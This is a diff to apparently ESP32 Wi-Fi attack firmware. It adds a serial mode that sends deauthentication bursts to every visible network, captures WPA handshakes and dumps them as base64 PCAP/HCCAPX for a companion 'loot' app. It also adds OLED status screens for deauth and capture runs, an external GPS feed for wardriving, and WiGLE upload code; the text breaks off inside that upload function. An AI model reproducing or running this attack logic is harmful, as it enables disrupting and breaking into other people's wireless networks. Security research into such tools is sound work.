-        int gps_len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(10));
-        if (gps_len > 0) {
-            wardrive_gps_buffer[gps_len] = '\0';
-            char *line = strtok(wardrive_gps_buffer, "\r\n");
-            while (line != NULL) {
-                parse_gps_nmea(line);
-                line = strtok(NULL, "\r\n");
+        // Read GPS source
+        int gps_len = 0;
+        if (!external_feed) {
+            gps_len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(10));
+            if (gps_len > 0) {
+                wardrive_gps_buffer[gps_len] = '\0';
+                char *line = strtok(wardrive_gps_buffer, "\r\n");
+                while (line != NULL) {
+                    parse_gps_nmea(line);
+                    line = strtok(NULL, "\r\n");
+                }
             }
         }
 
@@ -4195,14 +4616,19 @@ static void wardrive_promisc_task(void *pvParameters) {
             esp_wifi_set_promiscuous(false);
 
             while (!current_gps.valid && wardrive_promisc_active && !operation_stop_requested) {
-                gps_len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer,
-                                          GPS_BUF_SIZE - 1, pdMS_TO_TICKS(1000));
-                if (gps_len > 0) {
-                    wardrive_gps_buffer[gps_len] = '\0';
-                    char *line = strtok(wardrive_gps_buffer, "\r\n");
-                    while (line != NULL) {
-                        parse_gps_nmea(line);
-                        line = strtok(NULL, "\r\n");
+                if (external_feed) {
+                    gps_sync_from_selected_external_source();
+                    vTaskDelay(pdMS_TO_TICKS(200));
+                } else {
+                    gps_len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer,
+                                              GPS_BUF_SIZE - 1, pdMS_TO_TICKS(1000));
+                    if (gps_len > 0) {
+                        wardrive_gps_buffer[gps_len] = '\0';
+                        char *line = strtok(wardrive_gps_buffer, "\r\n");
+                        while (line != NULL) {
+                            parse_gps_nmea(line);
+                            line = strtok(NULL, "\r\n");
+                        }
                     }
                 }
             }
@@ -4274,6 +4700,11 @@ static void wardrive_promisc_task(void *pvParameters) {
                     sd_sync();
                     last_flush_count = current_count;
                     MY_LOG_INFO(TAG, "Flushed %d networks to %s", current_count, filename);
+                    {
+                        char wdp_fl3[64];
+                        snprintf(wdp_fl3, sizeof(wdp_fl3), "  %d networks", current_count);
+                        oled_display_update_full("> Wardrive Pro", "  Flushed to SD", wdp_fl3, "  D-UCB active");
+                    }
                 }
             }
         }
@@ -4311,6 +4742,7 @@ cleanup:
 
 static int cmd_start_wardrive_promisc(int argc, char **argv) {
     (void)argc; (void)argv;
+    oled_display_update_full("> Wardrive Pro", "  Promiscuous", "  GPS + SD log", "  Active...");
     log_memory_info("start_wardrive_promisc");
 
     if (!ensure_wifi_mode()) {
@@ -4338,14 +4770,22 @@ static int cmd_start_wardrive_promisc(int argc, char **argv) {
 
     MY_LOG_INFO(TAG, "Starting promiscuous wardrive mode...");
 
-    int baud = gps_get_baud_for_module(current_gps_module);
-    esp_err_t ret = init_gps_uart(baud);
-    if (ret != ESP_OK) {
-        MY_LOG_INFO(TAG, "Failed to initialize GPS UART: %s", esp_err_to_name(ret));
-        return 1;
+    const bool external_feed = gps_module_uses_external_feed(current_gps_module);
+
+    esp_err_t ret = ESP_OK;
+    if (!external_feed) {
+        int baud = gps_get_baud_for_module(current_gps_module);
+        ret = init_gps_uart(baud);
+        if (ret != ESP_OK) {
+            MY_LOG_INFO(TAG, "Failed to initialize GPS UART: %s", esp_err_to_name(ret));
+            return 1;
+        }
+        MY_LOG_INFO(TAG, "GPS UART initialized on pins %d (TX) and %d (RX) at %d baud",
+                    GPS_TX_PIN, GPS_RX_PIN, baud);
+    } else {
+        MY_LOG_INFO(TAG, "Using external GPS feed. Provide fixes via '%s'.",
+                    gps_external_position_command_name(current_gps_module));
     }
-    MY_LOG_INFO(TAG, "GPS UART initialized on pins %d (TX) and %d (RX) at %d baud",
-                GPS_TX_PIN, GPS_RX_PIN, baud);
 
     ret = init_sd_card();
     if (ret != ESP_OK) {
@@ -4826,19 +5266,144 @@ static void hs_sniffer_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t typ
     }
 }
 
+// ============================================================================
+// Serial PCAP/HCCAPX dump helpers (start_handshake_serial output)
+// ============================================================================
+
+/**
+ * @brief Base64-encode binary data and print over serial with markers.
+ *
+ * Output format:
+ *   <begin_marker>
+ *   <base64 lines, 76 chars each>
+ *   <end_marker>
+ */
+static void dump_base64_serial(const char *begin_marker, const char *end_marker,
+                               const uint8_t *data, size_t len) {
+    printf("%s\n", begin_marker);
+
+    // Calculate required buffer size for base64 encoding
+    size_t encoded_len = 0;
+    mbedtls_base64_encode(NULL, 0, &encoded_len, data, len);
+
+    uint8_t *encoded = malloc(encoded_len + 1);
+    if (!encoded) {
+        printf("ERROR: malloc failed for base64 (%u bytes)\n", (unsigned)encoded_len);
+        printf("%s\n", end_marker);
+        return;
+    }
+
+    size_t olen = 0;
+    int ret = mbedtls_base64_encode(encoded, encoded_len + 1, &olen, data, len);
+    if (ret != 0) {
+        printf("ERROR: base64 encode failed (%d)\n", ret);
+        free(encoded);
+        printf("%s\n", end_marker);
+        return;
+    }
+
+    // Print in 76-character lines (standard base64 line length)
+    for (size_t i = 0; i < olen; i += 76) {
+        size_t chunk = (olen - i > 76) ? 76 : (olen - i);
+        printf("%.*s\n", (int)chunk, (char *)(encoded + i));
+    }
+
+    free(encoded);
+    printf("%s\n", end_marker);
+}
+
+/**
+ * @brief Dump captured handshake data as base64 over serial.
+ *
+ * Outputs PCAP and HCCAPX buffers with markers that the Python app
+ * (loot_manager.py) can parse. Also prints SSID/AP metadata.
+ *
+ * Expected format parsed by Python side:
+ *   --- PCAP BEGIN ---
+ *   <base64 lines>
+ *   --- PCAP END ---
+ *   PCAP_SIZE: <N>
+ *   --- HCCAPX BEGIN ---
+ *   <base64 lines>
+ *   --- HCCAPX END ---
+ *   SSID: <ssid>  AP: <XX:XX:XX:XX:XX:XX>
+ */
+static void handshake_dump_serial(void) {
+    MY_LOG_INFO(TAG, "Dumping handshake data via serial (base64)...");
+
+    // Get PCAP buffer (contains all captured frames)
+    unsigned pcap_size = 0;
+    uint8_t *pcap_buf = attack_handshake_get_pcap(&pcap_size);
+
+    if (!pcap_buf || pcap_size == 0) {
+        MY_LOG_INFO(TAG, "No PCAP data captured - nothing to dump");
+        return;
+    }
+
+    MY_LOG_INFO(TAG, "PCAP buffer: %u bytes", pcap_size);
+
+    // Dump PCAP as base64
+    dump_base64_serial("--- PCAP BEGIN ---", "--- PCAP END ---", pcap_buf, pcap_size);
+    printf("PCAP_SIZE: %u\n", pcap_size);
+
+    // Dump HCCAPX as base64 (if available)
+    hccapx_t *hccapx = (hccapx_t *)attack_handshake_get_hccapx();
+    if (hccapx && hccapx->essid_len > 0) {
+        dump_base64_serial("--- HCCAPX BEGIN ---", "--- HCCAPX END ---",
+                           (const uint8_t *)hccapx, sizeof(hccapx_t));
+
+        // Print SSID and AP MAC metadata (for Python-side filename generation)
+        char ssid[33] = {0};
+        memcpy(ssid, hccapx->essid, hccapx->essid_len);
+        printf("SSID: %s  AP: %02X:%02X:%02X:%02X:%02X:%02X\n",
+               ssid,
+               hccapx->mac_ap[0], hccapx->mac_ap[1], hccapx->mac_ap[2],
+               hccapx->mac_ap[3], hccapx->mac_ap[4], hccapx->mac_ap[5]);
+    }
+
+    // Also log all captured APs from sniffer mode
+    if (!handshake_selected_mode && hs_ap_count > 0) {
+        int captured = 0;
+        for (int i = 0; i < hs_ap_count; i++) {
+            if (hs_ap_targets[i].complete) {
+                MY_LOG_INFO(TAG, "Captured: SSID='%s' BSSID=%02X:%02X:%02X:%02X:%02X:%02X Ch=%d",
+                    hs_ap_targets[i].ssid,
+                    hs_ap_targets[i].bssid[0], hs_ap_targets[i].bssid[1],
+                    hs_ap_targets[i].bssid[2], hs_ap_targets[i].bssid[3],
+                    hs_ap_targets[i].bssid[4], hs_ap_targets[i].bssid[5],
+                    hs_ap_targets[i].channel);
+                captured++;
+            }
+        }
+        MY_LOG_INFO(TAG, "Total APs discovered: %d, handshakes captured: %d", hs_ap_count, captured);
+    }
+
+    MY_LOG_INFO(TAG, "Serial PCAP dump complete.");
+}
+
 // Cleanup function for handshake attack
 static void handshake_cleanup(void) {
     MY_LOG_INFO(TAG, "Handshake attack cleanup...");
-    
+
     // Stop any active handshake attack (selected mode uses this)
     attack_handshake_stop();
-    
+
     // Disable promiscuous mode (sniffer mode uses this)
     esp_wifi_set_promiscuous(false);
-    
-    // Reset state
+
+    // Mark task as finished BEFORE serial dump — cmd_stop() waits for
+    // task_handle == NULL and will force-kill the task after 1s timeout.
+    // The base64 serial dump takes ~1s, so we must clear the handle first
+    // to prevent cmd_stop() from killing us mid-dump.
     handshake_attack_active = false;
     handshake_attack_task_handle = NULL;
+
+    // If serial mode, dump PCAP/HCCAPX via serial BEFORE resetting state
+    // (hs_ap_targets still holds captured AP info at this point)
+    if (handshake_serial_mode) {
+        handshake_dump_serial();
+        handshake_serial_mode = false;
+    }
     handshake_target_count = 0;
     handshake_current_index = 0;
     memset(handshake_targets, 0, MAX_AP_CNT * sizeof(wifi_ap_record_t));
@@ -4891,22 +5456,34 @@ static void attack_network_with_burst(const wifi_ap_record_t *ap) {
     MY_LOG_INFO(TAG, "Burst attacking '%s' (Ch %d, RSSI: %d dBm)", 
                 ap->ssid, ap->primary, ap->rssi);
     
+    char burst_l2[64], burst_l3[64];
+    snprintf(burst_l2, sizeof(burst_l2), ">> %s", (const char *)ap->ssid);
+    snprintf(burst_l3, sizeof(burst_l3), "  Ch %d  %ddB", ap->primary, ap->rssi);
+    
     // Start attack on this network
     attack_handshake_start(ap, ATTACK_HANDSHAKE_METHOD_BROADCAST);
     
-    // Send initial burst (attack_handshake_start already sends first deauth)
-    // The timer will continue sending every 2s
-    
     // Wait and check for handshake - 3 deauth bursts with 3s wait each
     for (int burst = 0; burst < 3 && handshake_attack_active && !operation_stop_requested; burst++) {
+        {
+            char burst_l4[64];
+            snprintf(burst_l4, sizeof(burst_l4), "  Burst %d/3 ...", burst + 1);
+            oled_display_update_full("> WPA Capture", burst_l2, burst_l3, burst_l4);
+        }
+        
         // Wait 3 seconds for clients to reconnect after deauth
         for (int i = 0; i < 30 && handshake_attack_active && !operation_stop_requested; i++) {
             vTaskDelay(pdMS_TO_TICKS(100));
+            
+            if (i == 15) {
+                oled_display_update_full("> WPA Capture", burst_l2, burst_l3, "  Listening...");
+            }
             
             // Check if handshake captured
             if (attack_handshake_is_complete()) {
                 MY_LOG_INFO(TAG, "✓ Handshake captured for '%s' after burst #%d!", 
                            ap->ssid, burst + 1);
+                oled_display_update_full("> WPA Capture", burst_l2, burst_l3, "  >> CAPTURED!");
                 
                 // Wait 2s to capture any remaining frames
                 vTaskDelay(pdMS_TO_TICKS(2000));
@@ -4920,6 +5497,7 @@ static void attack_network_with_burst(const wifi_ap_record_t *ap) {
     
     // No handshake captured after 3 bursts
     MY_LOG_INFO(TAG, "✗ No handshake for '%s' after 3 bursts", ap->ssid);
+    oled_display_update_full("> WPA Capture", burst_l2, burst_l3, "  No handshake");
     attack_handshake_stop();
 }
 
@@ -4938,6 +5516,11 @@ static void handshake_attack_task_selected(void) {
         }
         if (all_captured) {
             MY_LOG_INFO(TAG, "All selected networks captured! Attack complete.");
+            {
+                char hs_l3[64];
+                snprintf(hs_l3, sizeof(hs_l3), "  %d handshakes", handshake_target_count);
+                oled_display_update_full("> WPA Capture", "  All done!", hs_l3, "  Complete!");
+            }
             break;
         }
         
@@ -4957,6 +5540,14 @@ static void handshake_attack_task_selected(void) {
             attacked_count++;
             MY_LOG_INFO(TAG, ">>> [%d/%d] Attacking '%s' (Ch %d, RSSI: %d dBm) <<<",
                        i + 1, handshake_target_count, (const char*)ap->ssid, ap->primary, ap->rssi);
+            
+            {
+                char hs_l1[64], hs_l2[64], hs_l3[64];
+                snprintf(hs_l1, sizeof(hs_l1), "> WPA [%d/%d]", i + 1, handshake_target_count);
+                snprintf(hs_l2, sizeof(hs_l2), ">> %s", (const char *)ap->ssid);
+                snprintf(hs_l3, sizeof(hs_l3), "  Ch %d  %ddB", ap->primary, ap->rssi);
+                oled_display_update_full(hs_l1, hs_l2, hs_l3, "  Attacking...");
+            }
             
             attack_network_with_burst(ap);
             
@@ -4980,7 +5571,18 @@ static void handshake_attack_task_selected(void) {
         }
         if (all_done) {
             MY_LOG_INFO(TAG, "All selected networks captured!");
+            {
+                char hs_l3[64];
+                snprintf(hs_l3, sizeof(hs_l3), "  %d handshakes", handshake_target_count);
+                oled_display_update_full("> WPA Capture", "  All done!", hs_l3, "  Complete!");
+            }
             break;
+        }
+        {
+            char hs_l3[64], hs_l4[64];
+            snprintf(hs_l3, sizeof(hs_l3), "  Cap:%d Rem:%d", captured_count, remaining);
+            snprintf(hs_l4, sizeof(hs_l4), "  Next cycle...");
+            oled_display_update_full("> WPA Capture", "  Cycle done", hs_l3, hs_l4);
         }
         MY_LOG_INFO(TAG, "%d networks remaining, repeating...", remaining);
         vTaskDelay(pdMS_TO_TICKS(3000));
@@ -5036,6 +5638,14 @@ static void handshake_attack_task_sniffer(void) {
         // Switch channel
         esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
         
+        {
+            char hss_l2[64], hss_l3[64], hss_l4[64];
+            snprintf(hss_l2, sizeof(hss_l2), "  Scan Ch %d", channel);
+            snprintf(hss_l3, sizeof(hss_l3), "  AP:%d Cli:%d", hs_ap_count, hs_client_count);
+            snprintf(hss_l4, sizeof(hss_l4), "  Cap:%d D-UCB", total_handshakes_captured);
+            oled_display_update_full("> WPA Sniffer", hss_l2, hss_l3, hss_l4);
+        }
+        
         // Reset per-dwell counters
         hs_dwell_new_clients = 0;
         hs_dwell_eapol_frames = 0;
@@ -5075,6 +5685,14 @@ static void handshake_attack_task_sniffer(void) {
                        client->mac[0], client->mac[1], client->mac[2],
                        client->mac[3], client->mac[4], client->mac[5]);
             
+            {
+                char hss_l2[64], hss_l3[64];
+                snprintf(hss_l2, sizeof(hss_l2), ">> %s", ap->ssid);
+                snprintf(hss_l3, sizeof(hss_l3), "  Deauth %02X:%02X:%02X",
+                         client->mac[3], client->mac[4], client->mac[5]);
+                oled_display_update_full("> WPA Sniffer", hss_l2, hss_l3, "  Hunting...");
+            }
+            
             // Re-init HCCAPX serializer for this AP (so save works correctly)
             {
                 size_t ssid_len = strlen(ap->ssid);
@@ -5100,33 +5718,77 @@ static void handshake_attack_task_sniffer(void) {
         double reward = (double)hs_dwell_new_clients + 3.0 * (double)hs_dwell_eapol_frames;
         ducb_update(ch_idx, reward);
         
-        // Check for completed handshakes and save
+        // Check for completed handshakes and save (SD or serial)
         for (int i = 0; i < hs_ap_count; i++) {
             hs_ap_target_t *ap = &hs_ap_targets[i];
             if (ap->complete && !ap->has_existing_file) {
                 MY_LOG_INFO(TAG, "Saving complete handshake for '%s'...", ap->ssid);
-                // Re-init HCCAPX for this AP before save
-                size_t ssid_len = strlen(ap->ssid);
-                hccapx_serializer_init((const uint8_t *)ap->ssid, ssid_len);
-                
-                if (hs_save_handshake_to_sd(i)) {
+
+                if (handshake_serial_mode) {
+                    // Serial mode: dump PCAP/HCCAPX via serial as base64
+                    // NOTE: dump BEFORE hccapx_serializer_init() which resets message_pair
+                    unsigned pcap_size = 0;
+                    uint8_t *pcap_buf = attack_handshake_get_pcap(&pcap_size);
+                    if (pcap_buf && pcap_size > 0) {
+                        dump_base64_serial("--- PCAP BEGIN ---", "--- PCAP END ---",
+                                           pcap_buf, pcap_size);
+                        printf("PCAP_SIZE: %u\n", pcap_size);
+                    }
+                    // Get HCCAPX before re-init (message_pair is still valid from capture)
+                    hccapx_t *hccapx = (hccapx_t *)attack_handshake_get_hccapx();
+                    if (hccapx) {
+                        dump_base64_serial("--- HCCAPX BEGIN ---", "--- HCCAPX END ---",
+                                           (const uint8_t *)hccapx, sizeof(hccapx_t));
+                    }
+                    // Print SSID/AP metadata from hs_ap_targets (always reliable)
+                    printf("SSID: %s  AP: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                           ap->ssid,
+                           ap->bssid[0], ap->bssid[1], ap->bssid[2],
+                           ap->bssid[3], ap->bssid[4], ap->bssid[5]);
+
                     ap->has_existing_file = true;
                     total_handshakes_captured++;
-                    // Tab5 parses: strstr("Handshake #") && strstr("captured")
-                    MY_LOG_INFO(TAG, "Handshake #%d captured! (APs: %d, Clients: %d)",
+                    MY_LOG_INFO(TAG, "Handshake #%d sent via serial! (APs: %d, Clients: %d)",
                                total_handshakes_captured, hs_ap_count, hs_client_count);
-                    
-                    // Re-init PCAP after save to free memory and start fresh
+                    {
+                        char hss_l2[64], hss_l4[64];
+                        snprintf(hss_l2, sizeof(hss_l2), ">> %s", ap->ssid);
+                        snprintf(hss_l4, sizeof(hss_l4), "  >> Saved! #%d", total_handshakes_captured);
+                        oled_display_update_full("> WPA Sniffer", hss_l2, "  Handshake OK!", hss_l4);
+                    }
+
+                    // Re-init serializers for next AP
                     pcap_serializer_init();
-                    // Re-capture beacons for remaining APs
+                    hccapx_serializer_init((const uint8_t *)"", 0);
                     for (int j = 0; j < hs_ap_count; j++) {
                         if (!hs_ap_targets[j].complete && !hs_ap_targets[j].has_existing_file) {
-                            hs_ap_targets[j].beacon_captured = false; // Will be re-captured
+                            hs_ap_targets[j].beacon_captured = false;
                         }
                     }
                 } else {
-                    // Tab5 parses: strstr("No handshake for")
-                    MY_LOG_INFO(TAG, "No handshake for '%s' - save failed", ap->ssid);
+                    // SD mode: re-init HCCAPX for this AP, then save to SD
+                    size_t ssid_len = strlen(ap->ssid);
+                    hccapx_serializer_init((const uint8_t *)ap->ssid, ssid_len);
+
+                    if (hs_save_handshake_to_sd(i)) {
+                        ap->has_existing_file = true;
+                        total_handshakes_captured++;
+                        // Tab5 parses: strstr("Handshake #") && strstr("captured")
+                        MY_LOG_INFO(TAG, "Handshake #%d captured! (APs: %d, Clients: %d)",
+                                   total_handshakes_captured, hs_ap_count, hs_client_count);
+
+                        // Re-init PCAP after save to free memory and start fresh
+                        pcap_serializer_init();
+                        // Re-capture beacons for remaining APs
+                        for (int j = 0; j < hs_ap_count; j++) {
+                            if (!hs_ap_targets[j].complete && !hs_ap_targets[j].has_existing_file) {
+                                hs_ap_targets[j].beacon_captured = false; // Will be re-captured
+                            }
+                        }
+                    } else {
+                        // Tab5 parses: strstr("No handshake for")
+                        MY_LOG_INFO(TAG, "No handshake for '%s' - save failed", ap->ssid);
+                    }
                 }
             }
         }
@@ -5200,11 +5862,25 @@ static void handshake_attack_task(void *pvParameters) {
 }
 
 static int cmd_start_deauth(int argc, char **argv) {
+    {
+        char oled_target[48];
+        oled_build_target_summary(oled_target, sizeof(oled_target));
+        char oled_ch[32];
+        oled_build_channel_info(oled_ch, sizeof(oled_ch));
+        oled_display_update_full("> Deauth Attack", oled_target, oled_ch, "  Active...");
+    }
     onlyDeauth = 1;
     return cmd_start_evil_twin(argc, argv);
 }
 
 static int cmd_start_handshake(int argc, char **argv) {
+    {
+        char oled_target[48];
+        oled_build_target_summary(oled_target, sizeof(oled_target));
+        char oled_ch[32];
+        oled_build_channel_info(oled_ch, sizeof(oled_ch));
+        oled_display_update_full("> WPA Capture", oled_target, "  Deauth+Capture", "  Hunting...");
+    }
     // Ensure WiFi is initialized
     if (!ensure_wifi_mode()) {
         return 1;
@@ -5322,6 +5998,7 @@ static int cmd_start_handshake(int argc, char **argv) {
 }
 
 static int cmd_save_handshake(int argc, char **argv) {
+    oled_display_update_full("> Save Capture", "  Writing PCAP", "  /lab/handshakes", "  SD Card...");
     // Avoid compiler warnings
     (void)argc; (void)argv;
     
@@ -5338,7 +6015,187 @@ static int cmd_save_handshake(int argc, char **argv) {
     }
 }
 
+// ============================================================================
+// start_handshake_serial — handshake capture with serial PCAP output (no SD)
+// ============================================================================
+
+static int cmd_start_handshake_serial(int argc, char **argv) {
+    (void)argc; (void)argv;
+
+    // Ensure WiFi is initialized
+    if (!ensure_wifi_mode()) {
+        return 1;
+    }
+
+    // Enable AP mode for raw frame injection (deauth packets)
+    if (!ensure_ap_mode()) {
+        MY_LOG_INFO(TAG, "Failed to enable AP mode for deauth injection");
+        return 1;
+    }
+
+    // Check if handshake attack is already running
+    if (handshake_attack_active || handshake_attack_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Handshake attack already running. Use 'stop' to stop it first.");
+        return 1;
+    }
+
+    // Reset stop flag
+    operation_stop_requested = false;
+
+    // Initialize state
+    handshake_target_count = 0;
+    handshake_current_index = 0;
+    memset(handshake_targets, 0, MAX_AP_CNT * sizeof(wifi_ap_record_t));
+    memset(handshake_captured, 0, sizeof(handshake_captured));
+
+    // Force sniffer + D-UCB mode (attack all visible networks, no selection needed)
+    handshake_selected_mode = false;
+    // Enable serial output mode — cleanup will dump PCAP/HCCAPX as base64
+    handshake_serial_mode = true;
+
+    MY_LOG_INFO(TAG, "Starting WPA Handshake Capture - Serial PCAP Mode");
+    MY_LOG_INFO(TAG, "No SD card needed — PCAP/HCCAPX will be sent via serial (base64)");
+    MY_LOG_INFO(TAG, "Using Sniffer + D-UCB mode: all visible networks");
+    MY_LOG_INFO(TAG, "Will run until 'stop' command");
+    MY_LOG_INFO(TAG, "Python app will parse and save .pcap/.hccapx files automatically");
+
+    // Start handshake attack task
+    handshake_attack_active = true;
+    BaseType_t result = xTaskCreate(
+        handshake_attack_task,
+        "hs_serial",
+        12288,  // Stack size
+        NULL,
+        5,      // Priority
+        &handshake_attack_task_handle
+    );
+
+    if (result != pdPASS) {
+        MY_LOG_INFO(TAG, "Failed to create handshake attack task!");
+        handshake_attack_active = false;
+        handshake_serial_mode = false;
+        return 1;
+    }
+
+    return 0;
+}
+
 // --------------- WPA-SEC commands ---------------
+
+static bool wigle_split_key_pair(const char *input,
+                                 char *api_name,
+                                 size_t api_name_sz,
+                                 char *api_token,
+                                 size_t api_token_sz) {
+    if (!input || !api_name || !api_token || api_name_sz == 0 || api_token_sz == 0) {
+        return false;
+    }
+
+    const char *start = input;
+    while (*start && isspace((unsigned char)*start)) {
+        start++;
+    }
+
+    const char *sep = strchr(start, ':');
+    if (!sep || sep == start) {
+        return false;
+    }
+
+    const char *name_end = sep;
+    while (name_end > start && isspace((unsigned char)*(name_end - 1))) {
+        name_end--;
+    }
+
+    const char *token_start = sep + 1;
+    while (*token_start && isspace((unsigned char)*token_start)) {
+        token_start++;
+    }
+
+    const char *token_end = token_start + strlen(token_start);
+    while (token_end > token_start && isspace((unsigned char)*(token_end - 1))) {
+        token_end--;
+    }
+
+    size_t name_len = (size_t)(name_end - start);
+    size_t token_len = (size_t)(token_end - token_start);
+    if (name_len == 0 || token_len == 0) {
+        return false;
+    }
+    if (name_len >= api_name_sz || token_len >= api_token_sz) {
+        return false;
+    }
+
+    memcpy(api_name, start, name_len);
+    api_name[name_len] = '\0';
+    memcpy(api_token, token_start, token_len);
+    api_token[token_len] = '\0';
+    return true;
+}
+
+static bool wigle_is_upload_candidate(const char *filename) {
+    if (!filename) {
+        return false;
+    }
+    size_t len = strlen(filename);
+    if (len > 4 && strcasecmp(filename + len - 4, ".log") == 0) {
+        return true;
+    }
+    if (len > 4 && strcasecmp(filename + len - 4, ".txt") == 0) {
+        return true;
+    }
+    if (len > 4 && strcasecmp(filename + len - 4, ".csv") == 0) {
+        return true;
+    }
+    return false;
+}
+
+static const char *wigle_basename(const char *path) {
+    if (!path) {
+        return NULL;
+    }
+    const char *base = path;
+    const char *slash = strrchr(path, '/');
+    const char *bslash = strrchr(path, '\\');
+    if (slash && bslash) {
+        base = (slash > bslash) ? (slash + 1) : (bslash + 1);
+    } else if (slash) {
+        base = slash + 1;
+    } else if (bslash) {
+        base = bslash + 1;
+    }
+    return base;
+}
+
+static bool wigle_resolve_upload_target(const char *arg, char *out_path, size_t out_path_sz, char *out_name, size_t out_name_sz) {
+    if (!arg || !out_path || !out_name || out_path_sz == 0 || out_name_sz == 0) {
+        return false;
+    }
+
+    const char *name = wigle_basename(arg);
+    if (!name || name[0] == '\0' || !wigle_is_upload_candidate(name)) {
+        return false;
+    }
+
+    if (strchr(arg, '/') || strchr(arg, '\\')) {
+        if (strncmp(arg, "/sdcard/", 8) == 0) {
+            snprintf(out_path, out_path_sz, "%s", arg);
+        } else if (strncmp(arg, "sdcard/", 7) == 0) {
+            snprintf(out_path, out_path_sz, "/%s", arg);
+        } else {
+            return false;
+        }
+    } else {
+        snprintf(out_path, out_path_sz, "/sdcard/lab/wardrives/%s", name);
+    }
+
+    snprintf(out_name, out_name_sz, "%s", name);
+
+    struct stat st;
+    if (stat(out_path, &st) != 0 || !S_ISREG(st.st_mode)) {
+        return false;
+    }
+    return true;
+}
 
 static int cmd_wpasec_key(int argc, char **argv) {
     if (argc < 2) {
@@ -5552,6 +6409,7 @@ static int wpasec_upload_file(const char *filepath, const char *filename) {
 
 static int cmd_wpasec_upload(int argc, char **argv) {
     (void)argc; (void)argv;
+    oled_display_update_full("> WPA-sec", "  Sending PCAPs", "  wpa-sec.stanev", "  Uploading...");
 
     // 1. Check WiFi STA is connected
     wifi_ap_record_t ap_info;
@@ -5645,11 +6503,443 @@ static int cmd_wpasec_upload(int argc, char **argv) {
     return (failed > 0) ? 1 : 0;
 }
 
+/**
+ * @brief Upload a single Wardrive file (.log/.txt/.csv) to api.wigle.net
+ *
+ * @return 0 on success, 1 on duplicate/skipped, 2 on auth error, -1 on error
+ */
+static int wigle_upload_file(const char *filepath, const char *filename) {
+    const size_t CHUNK_SIZE = 2048;
+    const size_t HDR_BUF_SZ = 640;
+    const size_t RESP_BUF_SZ = 640;
+    int result = -1;
+    FILE *f = NULL;
+    esp_tls_t *tls = NULL;
+    uint8_t *chunk_buf = NULL;
+    char *http_headers = NULL;
+    char *resp_buf = NULL;
+
+    f = fopen(filepath, "rb");
+    if (!f) {
+        MY_LOG_INFO(TAG, "  Failed to open: %s", filepath);
+        goto cleanup;
+    }
+
+    fseek(f, 0, SEEK_END);
+    long file_size = ftell(f);
+    fseek(f, 0, SEEK_SET);
+    if (file_size <= 0 || file_size > 16L * 1024L * 1024L) {
+        MY_LOG_INFO(TAG, "  Invalid file size: %ld bytes", file_size);
+        goto cleanup;
+    }
+
+    char auth_plain[2 * WIGLE_KEY_MAX_LEN + 2];
+    int auth_plain_len = snprintf(auth_plain, sizeof(auth_plain), "%s:%s", wigle_api_name, wigle_api_token);
+    if (auth_plain_len <= 0 || auth_plain_len >= (int)sizeof(auth_plain)) {
+        MY_LOG_INFO(TAG, "  WiGLE credentials are too long");
+        goto cleanup;
+    }
+
+    unsigned char auth_b64[220];
+    size_t auth_b64_len = 0;
+    int b64_ret = mbedtls_base64_encode(auth_b64, sizeof(auth_b64) - 1, &auth_b64_len,
+                                        (const unsigned char *)auth_plain, (size_t)auth_plain_len);
+    if (b64_ret != 0 || auth_b64_len == 0 || auth_b64_len >= sizeof(auth_b64)) {
+        MY_LOG_INFO(TAG, "  Failed to build WiGLE auth header");
+        goto cleanup;
+    }
+    auth_b64[auth_b64_len] = '\0';
+
+    char boundary[40];
+    snprintf(boundary, sizeof(boundary), "----WiGLE%lu", (unsigned long)(esp_timer_get_time() / 1000));
+
+    char body_start[256];
+    int start_len = snprintf(body_start, sizeof(body_start),
+                             "--%s\r\n"
+                             "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
+                             "Content-Type: text/csv\r\n\r\n",
+                             boundary, filename);
+    if (start_len <= 0 || start_len >= (int)sizeof(body_start)) {
+        MY_LOG_INFO(TAG, "  Failed to build multipart header");
+        goto cleanup;
+    }
+
+    char body_end[64];
+    int end_len = snprintf(body_end, sizeof(body_end), "\r\n--%s--\r\n", boundary);
+    if (end_len <= 0 || end_len >= (int)sizeof(body_end)) {
+        MY_LOG_INFO(TAG, "  Failed to build multipart footer");
+        goto cleanup;
+    }
+
+    int64_t body_total_len_64 = (int64_t)start_len + (int64_t)file_size + (int64_t)end_len;
+    if (body_total_len_64 <= 0 || body_total_len_64 > INT_MAX) {
+        MY_LOG_INFO(TAG, "  File too large for HTTP content-length: %ld bytes", file_size);
+        goto cleanup;
+    }
+    int body_total_len = (int)body_total_len_64;
+
+    http_headers = (char *)heap_caps_malloc(HDR_BUF_SZ, MALLOC_CAP_8BIT);
+    resp_buf = (char *)heap_caps_malloc(RESP_BUF_SZ, MALLOC_CAP_8BIT);
+    chunk_buf = (uint8_t *)heap_caps_malloc(CHUNK_SIZE, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
+    if (!chunk_buf) {
+        chunk_buf = (uint8_t *)heap_caps_malloc(CHUNK_SIZE, MALLOC_CAP_8BIT);
+    }
+    if (!http_headers || !resp_buf || !chunk_buf) {
+        MY_LOG_INFO(TAG, "  Buffer allocation failed (hdr/resp/chunk)");
+        goto cleanup;
+    }
+
+    int hdr_len = snprintf(http_headers, HDR_BUF_SZ,
+                           "POST /api/v2/file/upload HTTP/1.1\r\n"
+                           "Host: api.wigle.net\r\n"
+                           "Authorization: Basic %s\r\n"
+                           "Content-Type: multipart/form-data; boundary=%s\r\n"
+                           "Content-Length: %d\r\n"
+                           "User-Agent: projectZero-wigle\r\n"
+                           "Connection: close\r\n"
+                           "\r\n",
+                           (const char *)auth_b64, boundary, body_total_len);
+    if (hdr_len <= 0 || hdr_len >= (int)HDR_BUF_SZ) {
+        MY_LOG_INFO(TAG, "  Failed to build HTTP headers");
+        goto cleanup;
+    }
+
+    esp_tls_cfg_t tls_cfg = {
+        .crt_bundle_attach = NULL,
+        .timeout_ms = 20000,
+    };
+
+    tls = esp_tls_init();
+    if (!tls) {
+        MY_LOG_INFO(TAG, "  TLS init failed");
